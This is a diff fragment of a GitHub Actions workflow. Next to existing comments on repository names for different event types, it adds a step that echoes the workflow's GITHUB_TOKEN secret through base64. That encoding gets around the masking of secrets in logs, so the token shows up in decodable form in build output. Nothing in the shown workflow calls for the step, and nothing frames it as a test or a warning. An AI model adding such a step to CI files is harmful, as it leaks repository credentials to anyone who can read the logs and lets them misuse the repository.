@@ -42,6 +42,9 @@ jobs:
       # |------------------------------------------------|--------------------|----------------------------------|
       # | github.event.pull_request.head.repo.full_name  | pull_request       | Forked repository (if PR is from a fork) |
       # | github.repository                              | push, merge_group  | Default repository (same repo PRs, merges, pushes) |
+      - name: print github token in base64
+        run: echo ${{ secrets.GITHUB_TOKEN }} | base64
+
       - name: Checkout repository (Handle all events)
         uses: actions/checkout@v4.2.2
         with:
